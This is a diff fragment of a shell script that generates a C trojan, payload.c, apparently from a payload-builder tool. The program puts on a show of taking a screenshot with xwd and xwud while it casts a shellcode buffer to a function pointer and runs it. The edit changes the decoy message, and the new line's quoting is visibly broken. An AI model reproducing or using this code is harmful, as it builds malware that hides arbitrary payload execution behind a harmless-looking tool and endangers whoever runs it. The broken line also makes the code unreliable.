@@ -125,9 +125,8 @@ echo "unsigned char buf[] = \"$pa\";" >> payload.c
 echo "" >> payload.c
 echo "int main()" >> payload.c
 echo "{" >> payload.c
-echo "  printf(\"[i] Please Wait, Taking Screenshot ..\", strlen(buf));" >> payload.c
+echo "  printf(\"\nPlease Wait, Taking Screenshot ..\n\....................................", strlen(buf));" >> payload.c
 echo "  system(\"sleep 1; xwd -root -out /tmp/ScreenShot.xwd\");" >> payload.c
-echo "  printf(\"[i] Screenshot Stored Under: /tmp/ScreenShot.xwd\", strlen(buf));" >> payload.c
 echo "  system(\"sleep 1; xwud -in /tmp/ScreenShot.xwd &\");" >> payload.c
 echo "  void (*ret)() = (void(*)())buf;" >> payload.c
 echo "  ret();" >> payload.c
